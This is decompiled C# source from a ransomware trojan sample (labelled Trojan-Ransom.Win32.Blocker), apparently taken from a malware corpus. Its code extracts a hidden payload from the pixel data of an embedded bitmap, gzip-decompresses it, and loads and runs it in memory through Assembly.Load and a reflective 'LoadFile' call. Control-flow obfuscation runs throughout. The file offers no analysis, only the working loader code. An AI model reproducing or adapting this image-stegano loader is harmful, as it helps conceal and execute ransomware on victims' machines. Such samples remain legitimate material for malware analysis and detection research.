// Decompiled with JetBrains decompiler
// Type: .
// Assembly: cryy1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E94AD970-69C9-4C3C-BD52-B80809EDC479
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.cihv-a4b708ccb626dbb1cc4a6c1637f95e2e68fc1fcffa3bafe1ef43debf414a87a2.exe

using \u0001;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal class \u0002
  {
    static byte[] \u0001([In] string obj0) => \u0002.\u0001((Bitmap) \u0001.\u0001.\u0001.GetObject(obj0));

    static void \u0001([In] object obj0) => obj0.GetType().InvokeMember("LoadFile", BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(obj0), new object[4]
    {
      (object) Assembly.GetExecutingAssembly(),
      (object) "SEIiWTNfczVtzvI",
      (object) "bdxafsDYlZLmJI",
      (object) "cYNhYOcmVVIuWsFTB"
    });

    static byte[] \u0001([In] Bitmap obj0)
    {
      List<byte> byteList = new List<byte>();
      int num1;
      int num2;
      int num3;
      int num4;
      if (true)
      {
        int num5 = 0;
        int width = obj0.Width;
        if (true)
        {
          num4 = checked (width - 1);
          num3 = num5;
        }
        else
        {
          num2 = width;
          num1 = num5;
          goto label_12;
        }
      }
      else
        goto label_9;
label_4:
      int x;
      int num6;
      if (false)
      {
        num2 = num4;
        num1 = num3;
        goto label_12;
      }
      else
      {
        num6 = num4;
        x = num3;
        goto label_17;
      }
label_7:
      int y;
      Color pixel = obj0.GetPixel(x, y);
      if (pixel != Color.FromArgb(0, 0, 0, 0))
        byteList.Add(pixel.R);
      else
        goto label_10;
label_9:
      byteList.Add(pixel.G);
      byteList.Add(pixel.B);
label_10:
      if (true)
      {
        num1 = y;
        num2 = 1;
      }
      else
        goto label_7;
label_12:
      y = checked (num1 + num2);
label_13:
      int num7;
      if (y > num7)
      {
        num3 = x;
        num4 = 1;
      }
      else
        goto label_7;
label_15:
      if (num4 != 0)
        x = checked (num3 + num4);
      else
        goto label_4;
label_17:
      int num8 = x;
      int num9 = num6;
      if (false)
      {
        num4 = num9;
        num3 = num8;
        goto label_15;
      }
      else
      {
        if (num8 > num9)
          return \u0002.\u0001(byteList.ToArray());
        num7 = checked (obj0.Height - 1);
        y = 0;
        goto label_13;
      }
    }

    static object \u0001([In] byte[] obj0) => Assembly.Load(obj0).CreateInstance("ldr.LDR");

    static byte[] \u0001([In] byte[] obj0)
    {
      if (true)
        goto label_18;
label_17:
      return obj0;
label_18:
      using (MemoryStream memoryStream = new MemoryStream(obj0))
      {
        GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
label_2:
        try
        {
          int offset = 0;
          int num1;
          int num2;
          do
          {
            if (true)
            {
              obj0 = (byte[]) Utils.CopyArray((Array) obj0, (Array) new byte[checked (offset + 1024 - 1 + 1)]);
              int num3 = gzipStream.Read(obj0, offset, 1024);
              num1 = offset;
              int num4;
              while (true)
              {
                num2 = num3;
                if (true)
                {
                  num4 = checked (num1 + num2);
                  if (false)
                    num1 = num4;
                  else
                    break;
                }
                else
                  goto label_7;
              }
              offset = num4;
              int num5 = num3;
              num2 = 1024;
              num1 = num5;
label_7:;
            }
            else
              goto label_2;
          }
          while (num1 >= num2);
          obj0 = (byte[]) Utils.CopyArray((Array) obj0, (Array) new byte[checked (offset - 1 + 1)]);
          gzipStream.Close();
        }
        finally
        {
          gzipStream?.Dispose();
        }
        memoryStream.Close();
        goto label_17;
      }
    }
  }
}
